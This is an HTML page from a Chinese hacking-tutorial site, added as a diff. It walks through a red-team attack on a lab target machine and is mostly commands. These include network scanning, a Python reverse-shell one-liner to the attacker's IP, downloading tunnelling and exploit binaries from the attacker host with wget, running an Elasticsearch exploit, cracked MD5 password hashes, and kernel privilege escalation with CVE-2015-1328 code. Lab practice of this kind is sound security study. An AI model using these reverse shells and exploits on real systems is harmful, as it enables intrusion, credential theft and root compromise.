@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+
+<!--欢迎来到hk987，人类的进化就靠你了-->
+ <!--
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░ ░▒▓██████▓▒░░▒▓████████▓▒░ 
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░░░░░░▒▓█▓▒░ 
+░▒▓████████▓▒░▒▓███████▓▒░░░▒▓███████▓▒░░▒▓██████▓▒░░░░░░▒▓█▓▒░  
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░░░░░░▒▓█▓▒░░░▒▓█▓▒░▒▓█▓▒░░░░░▒▓█▓▒░  
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░░░░░░▒▓█▓▒░░░▒▓█▓▒░▒▓█▓▒░░░░▒▓█▓▒░   
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░ ░▒▓██████▓▒░░░░▒▓█▓▒░
+-->
+<!--
+  无人扶我青云志，
+	我自踏雪至山巅，
+	倘若命中无此运，
+	孤身亦可登昆仑。
+-->
+<!--Copyright©hk987.xyz-->
+<!--PC端Google和Firefox支持良好,移动端支持良好-->
+
+<html lang="zh-cn">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0,minimum-scale=1.0, maximum-scale=1.0,user-scalable=no">
+	<meta name="description" content="-hk987-">
+	<meta name="author" content="hk987">
+	<meta name="keywords" content="hk987,hk987.xyz,hack987,黑客987,黑客学习,Windows技术,Linux技术,Archlinux,Linux软件,漏洞挖掘,网络安全,渗透测试,自动化办公,python全自动办公,Windows系统激活,新手学电脑,IT技术,Rust,Rust编程,黑客技术,黑客,红客,honker,hack,hacker,网络安全,信息安全,网络安全学习,计算机小白,网安入门,网络安全入门,渗透测试,黑客技术,网络基础入门,操作系统,新手学电脑,小白学电脑,hack学习,hack入门,Windows基础,linux基础,Archlinux基础,Rust基础,Rust入门,Rust编程基础,黑客入门,Ubuntu入门,Manjaro,Endeavouros,红帽系统,centos基础学习,Rocky系统基础,Linux基础命令,Windows批处理,Windows安全,Linux安全,Kali基础,Kali渗透测试,KaliLinux,BlackArch,Github,加密解密,具体数学,线性代数,离散数学,红队攻防,蓝队攻防,黑客靶场练习,黑客靶场,黑客实战,hack实战,hack编程,黑客编程">
+	<title>[Hack实战]-1-靶机红队攻防实验 - hk987.xyz - www.hk987.xyz</title>
+	<link rel="shortcut icon" type="image/x-icon" href="../logo/favicon.png">
+	<link rel="stylesheet" type="text/css" href="../css/basic.css">
+	<link rel="stylesheet" type="text/css" href="../css/home.css">
+	<link rel="stylesheet" type="text/css" href="../css/text.css">
+	<!--prism.js代码高亮模块-->
+	<link rel="stylesheet" href="../css/prism.css" data-noprefix />
+	<script src="../plugins/prism.js"></script>
+	<!--/prism.js代码高亮模块-->
+</head>
+<body>
+	<!--header -->
+	<header id="nav">
+			<div class="nav-container">
+				<!-- 根大纲-->
+				<a href="../index.html" title="Hk987首页">
+					<h1 class="nav-logo">HK987 - hk987.xyz</h1>
+				</a>
+				<h2 class="nav-site-description desc-hidden">
+					 S=−k∑pilnpi
+				</h2>
+				<nav class="nav-links">
+					<!-- nav连接大纲-->
+					<h1 style="display:none;">网站导航</h1>
+					<ul>
+						<li>
+							<a href="../index.html" title="sitemap">
+								<span class="link-word"><img src="../logo/archives.png" alt="archives" class="link-img"><span class="word-hidden">wiki</span></span>
+							</a>
+						</li>
+					</ul>
+				</nav>
+			</div>
+	</header>
+	<!-- /header -->
+
+	<!-- content-->
+	<div id="content">
+		<div class="content-container">
+			<!-- 文章区 -->
+			<article class="text-container">
+				<header class="text-header">
+					<h1>[Hack实战]-1-靶机红队攻防实验</h1>	
+				</header>
+				<section class="text-body">
+					<h2>引言</h2>
+					<p>中等难度，靶机红队攻防实验#第1篇</p>
+					<!-- 目录 -->
+					<h2>文章目录</h2>
+					 <ul class="contents">	
+						 <li><a href="#Penetration-1">0×1.环境介绍</a></li>
+						 <li><a href="#Penetration-2">0×2.实战命令</a></li>
+						 <li><a href="#Penetration-3">0×3.视频演示</a></li>
+					 </ul>
+					<!-- /目录 -->
+
+					<!-- 正文 -->
+
+					<h2 id="Penetration-1">0×1.环境介绍</h2>
+
+					<p>攻击Kali主机IP：192.168.1.123</p>
+					<p>攻击主机与靶机在同一个网段192.168.1.0/24</p>
+
+					<h2 id="Penetration-2">0×2.实战思路</h2>
+					<p>下面的所有命令都使用root用户执行，如果是普通用户，请在命令前面添加sudo，</p>
+					<p>● 局域网发现</p>
+					<pre data-prismjs-copy='复制代码' data-prismjs-copy-success='成功复制！'>
+					<code class="language-bash">
+					#局域网二层扫描
+					#arp-scan -I 网卡名称 -l
+					arp-scan -I eth0 -l
+					</code>
+					</pre>
+
+					<p>● 全端口扫描</p>
+					<pre data-prismjs-copy='复制代码' data-prismjs-copy-success='成功复制！'>
+					<code class="language-bash">
+					#nmap -p- ip地址
+					nmap -p- 192.168.1.117
+
+					#-p-参数等同于-p1-65535
+					nmap -p1-65535 192.168.1.117
+					</code>
+					</pre>
+
+					<p>● 服务版本扫描</p>
+					<pre data-prismjs-copy='复制代码' data-prismjs-copy-success='成功复制！'>
+					<code class="language-bash">
+					#nmap -p[端口列表] -sV ip地址
+					#对21,22,80这三个端口做-sV服务版本扫描
+					nmap -p21,22,80 -sV 192.168.1.117
+					</code>
+					</pre>
+
+					<p>● Web路径枚举</p>
+					<pre data-prismjs-copy='复制代码' data-prismjs-copy-success='成功复制！'>
+					<code class="language-bash">
+					#爆破路径
+					#dirsearch -u http://IP地址
+					#dirsearch默认字典文件位置
+					#/usr/lib/python3/dist-packages/dirsearch/db/dicc.txt
+					dirsearch -u http://192.168.1.117
+					</code>
+					</pre>
+
+					<p>Web返回状态码：</p>
+					<pre>
+- **200 OK**：
+  - 当用户访问一个正常运行的网页时，会返回这个状态码。
+  - 例如，访问 https://www.example.com，页面成功加载，返回 200。
+
+- **301 Moved Permanently**：
+  - 当一个网站的页面永久迁移到一个新地址时，服务器返回这个状态码，并提供新的URL。
+  - 例如，访问 http://oldsite.com 可能会被重定向到 http://newsite.com。
+
+- **404 Not Found**：
+  - 当用户访问一个不存在的页面时，服务器返回这个状态码。
+  - 例如，访问 http://www.example.com/nonexistentpage 可能会返回 404。
+
+- **403 Forbidden**：
+  - 当用户尝试访问一个他们没有权限访问的页面时，服务器返回这个状态码。</pre>
+
+					<p>● RCE漏洞Python反弹Shell</p>
+					<pre data-prismjs-copy='复制代码' data-prismjs-copy-success='成功复制！'>
+					<code class="language-python">
+					#攻击主机，使用nc监听端口，等待反弹shell连接
+					nc -nvlp 2333
+
+					#被攻击主机漏洞页面，反弹Shell
+					#两种方式，根据代码调用方式使用
+					#192.168.1.123修改成攻击主机IP，2333修改成攻击主机监听端口
+					#代码不嵌入python
+					python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.123",2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+
+					#代码嵌入python
+					import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.123",2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
+					</code>
+					</pre>
+
+					<p>● docker容器判断方法</p>
+					<pre data-prismjs-copy='复制代码' data-prismjs-copy-success='成功复制！'>
+					<code class="language-bash">
+					#判断是否为docker系统
+					1.根目录中包含/.dockerenv文件
+					Docker系统的根目录中存在.dockerenv文件，主要用于标识当前环境是否为容器内部环境，并存储Docker守护进程的配置信息。
+
+					2.查看系统 cat /proc/1/cgroup 文件，包含docker字段
+					Linux系统启动时第1个PID的cgroup文件中如果包含docker字段，并且包含docker的哈希值，这说明当前为docker容器环境
+					11:hugetlb:/docker/439d6816b5d727320b7e8e2e473cefd10591c23b0e4d2459e53f59f23cfad785
+					</code>
+					</pre>
+
+					<p>● 使用shell脚本内网发现</p>
+					<pre data-prismjs-copy='复制代码' data-prismjs-copy-success='成功复制！'>
+					<code class="language-bash">
+					#内网简单的ping测试脚本，使用seq兼容性更好，部分系统不支持 {1..254}这种格式
+					#网段192.168.0.0/16
+					#方法1
+					for i in {0..255}; do for j in {1..254}; do ping -c 1 192.168.$i.$j; done; done
+					#方法2
+					for i in $(seq 0 255); do for j in $(seq 1 254); do ping -c 1 192.168.$i.$j; done; done
+
+					#网段192.168.1.0/24
+					#方法1
+					for i in {1..254}; do ping -c 1 192.168.1.$i; done
+					#方法2
+					for i in $(seq 1 10); do ping -c 1 192.168.1.$i; done
+
+					#筛选存活
+					for i in $(seq 1 10); do ping -c 1 192.168.1.$i; done | grep 64
+					</code>
+					</pre>
+
+					<p>● 内网穿透与隧道内网扫描</p>
+					<pre data-prismjs-copy='复制代码' data-prismjs-copy-success='成功复制！'>
+					<code class="language-bash">
+					#内网穿透工具Venom
+					https://github.com/Dliv3/Venom
+
+					#主控端，venom启动监听
+					#如果程序没有给x权限要先添加x权限：chomd +x a
+					./a -lport 1234
+
+					#主控端，使用python3开启http服务
+					python3 -m http.server 80
+
+					#被控端，使用wget下载主控端Venom程序
+					wget http://192.168.1.123/s
+
+					#内网穿透
+					##被控端，输入控制端IP和控制端监听的端口
+					chmod +x s
+					./s -rhost 192.168.1.123 -rport 1234
+
+					##控制端
+					show  #显示连接的节点id
+					goto 1  #进入第一个节点
+					socks 1080 #在第一个节点中，启用socks代理，代理端口1080
+					#这样操作之后，会在控制端本地启动1080端口，连接到被控端随机端口
+					#所有通过控制端1080端口的流量都会通过隧道发送给目标机器上的随机端口
+
+					#控制端，配置本地代理工具
+					#调用proxychains4执行命令，命令被proxychains4捕获，发往配置文件中指定的本地1080端口
+					#本地1080端口与远程局域网中的主机通过Venom建立了Socks隧道
+					#那么通过proxychains4执行的命令就会通过这个Socks隧道传输给远程局域网中的主机
+					#远程局域网主机起到了流量中转的作用
+					vim /etc/proxychains4.conf
+					socks5  127.0.0.1 1080
+
+					#通过proxychains4连接隧道，扫描远程局域网指定机器
+					#-sT TCP SYN扫描（-sT）会完成三次握手，建立完整的TCP连接
+					#-Pn 跳过端口扫描阶段，直接对目标主机的所有 1-65535 端口尝试连接，
+					#nmap 默认会先扫描开放端口（通过 ICMP、TCP SYN 等），
+					#再对开放端口执行后续操作（如脚本扫描），
+					#可降低触发警报的风险
+					#venom仅支持完整 TCP 连接：Venom 处理的是已建立三次握手的 TCP 流量，无法识别或处理半开连接（SYN 包）
+					#所以无法使用-p-这种方式扫描，因为这种方式默认使用-sS参数
+					proxychains4 nmap -Pn -sT 172.17.0.1
+					proxychains4 nmap -Pn -sT 172.17.0.2
+					proxychains4 nmap -Pn -sT 172.17.0.3
+
+					#对局域网主机开放的端口，进行服务版本探测
+					proxychains4 nmap -p22,5000 -sV -Pn -sT 172.17.0.1
+					proxychains4 nmap -p22,5000 -sV -Pn -sT 172.17.0.2
+					proxychains4 nmap -p9200 -sV -Pn -sT 172.17.0.3
+					</code>
+					</pre>
+  				
+  				<p>● ElasticSearch版本漏洞利用</p>
+					<pre data-prismjs-copy='复制代码' data-prismjs-copy-success='成功复制！'>
+					<code class="language-bash">
+					#搜索ElasticSearch版本漏洞
+					earchsploit Elasticsearch
+
+					#漏洞利用代码拷贝出来
+					#searchsploit搜索出来的漏洞代码都存放在/usr/share/exploitdb/exploits/目录中
+					cp /usr/share/exploitdb/exploits/multiple/webapps/33370.html ~
+					cp /usr/share/exploitdb/exploits/linux/remote/36337.py ~
+
+					#所有利用代码，都要先查看一下源代码
+					cat 36337.py
+
+					#使用漏洞利用代码进行尝试，因为36337.py源码使用的是python2环境
+					proxychains4 python2 36337.py 172.17.0.3
+					</code>
+					</pre>
+
+  				<p>● 破解md5密码</p>
+					<pre data-prismjs-copy='复制代码' data-prismjs-copy-success='成功复制！'>
+					<code class="language-bash">
+					#md5查询网站
+					https://www.somd5.com/
+					john:3f8184a7343664553fcb5337a3138814
+					test:861f194e9d6118f3d942a72be3e51749
+					admin:670c3bbc209a18dde5446e5e6c1f1d5b
+					root:b3d34352fc26117979deabdf1b9b6354
+					jane:5c158b60ed97c723b673529b8a3cf72b
+
+					#对应密码如下
+					1337hack
+					1234test
+					1111pass
+					1234pass
+					1234jane
+
+					#只有john可以登录
+					ssh john@192.168.1.117
+
+					#开始提权
+					</code>
+					</pre>
+					
+					<p>Linux提权常规方法三种：</p>
+					<p>1.通过内核漏洞</p>
+					<p>2.通过suid权限，拥有suid权限的程序存在可利用的漏洞</p>
+					<p>3.通过sudo -l查看当前用户在sudoers文件中是否存在NOPASSWD执行获得ALL权限的程序</p>
+
+					<p>● 通过内核漏洞提权</p>
+					<pre data-prismjs-copy='复制代码' data-prismjs-copy-success='成功复制！'>
+					<code class="language-bash">
+					#使用john登录系统，尝试sudo获取权限
+					sudo -s
+
+					#使用内核漏洞提权
+					#查看内核版本
+					uname -a
+
+					#搜索内核漏洞
+					searchsploit linux 3.13
+					Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'over | linux/local/37292.c
+					#拷贝利用代码到家目录
+					cp /usr/share/exploitdb/exploits/linux/local/37292.c ~
+
+					#按照源码描述，需要传到目标主机上编译然后运行编译好后的二进制文件，进行提权
+					#但是目标机器没有gcc编译软件，所以需要在本地编译好后传到目标机器，
+					#但这个源码中有一个坑，编译好后的二进制文件会再次调用gcc编译出一个so共享库文件提供给程序调用，
+					#所以需要修改源代码删除下面的部分，直接跳过编译ofs-lib.so文件的部分
+					fprintf(stderr,"creating shared library\n");
+					    lib = open("/tmp/ofs-lib.c",O_CREAT|O_WRONLY,0777);
+					    write(lib,LIB,strlen(LIB));
+					    close(lib);
+					    lib = system("gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w");
+					    if(lib != 0) {
+					        fprintf(stderr,"couldn't create dynamic library\n");
+					        exit(-1);
+					    }
+					
+					#然后在本地编译，但是kali无法编译，
+					#因为系统版本原因导致c语言头文件和版本不匹配
+					#解决方法是找一台与目标系统版本相同的主机进行编译
+					gcc -o 987 37292.c
+
+					#因为源码编译后的程序会调用ofs-lib.so这个库文件
+					#所以需要将这个库文件与编译后的调用程序一并传到目标主机
+					#查找kali中相同的库文件locate ofs-lib.so 拷贝到当前目录
+					/usr/share/metasploit-framework/data/exploits/CVE-2015-1328/ofs-lib.so
+
+					cp /usr/share/metasploit-framework/data/exploits/CVE-2015-1328/ofs-lib.so .
+
+					#再次在本地启用python3 http服务
+					python3 -m http.server 80
+
+					#目标主机下载漏洞利用文件
+					wget http://192.168.1.123/987
+					wget http://192.168.1.123/ofs-lib.so
+
+					#根据利用源码中的文件位置，将这两个文件拷贝到/tmp目录下
+					mv 987 ofs-lib.so /tmp
+
+					#添加x权限
+					chmod +x 987
+
+					#执行，获得root权限
+					./987
+					</code>
+					</pre>
+
+					<h2 id="Penetration-3">0×3.视频演示</h2>
+
+					<p>点击下方视频标题，可以进入B站观看高清版本</p>
+					<p>【第28天】渗透测试实战#1-内网穿透-大11女新新生挑战一年精通网络安全-渗透测试-红队渗透-安全攻防-靶机攻防-渗透实战</p>
+					<iframe src="//player.bilibili.com/player.html?isOutside=true&aid=114169894476781&bvid=BV15WQbYrEnK&cid=28889186801&p=1&autoplay=0" allowfullscreen="allowfullscreen" width="100%" height="500" scrolling="no" frameborder="0" ></iframe>
+					
+					<!-- /正文 -->
+
+				<footer class="text-footer">
+					<p>
+						*转载请注明来自:<a title="hk987.xyz" style="color: rgb(4,181,150);" href="https://www.hk987.xyz" target="_blank">hk987.xyz</a>
+					</p>
+					<p>*原文连接:<a title="[Hack实战]-1-靶机红队攻防实验#第1篇" style="color: rgb(4,181,150);" href="https://www.hk987.xyz/hk/hack-01.html" target="_blank">https://www.hk987.xyz/hk/hack-01.html</a></p>
+				</footer>
+			</article>
+			<!-- /文章区 -->	
+		</div>
+	</div>
+	<!-- /content -->
+	
+	<!-- footer -->
+	<footer id="footer">
+		<div class="footer-container">
+			hk987.xyz &nbsp;<img src="../logo/copyright.png" alt="未经作者允许,禁止任何形式的复制与转载" title="未经作者允许,禁止任何形式的复制与转载">&nbsp;All Rights Reserved.
+		</div>
+	</footer>
+	<!-- /footer -->
+</body>
+</html>
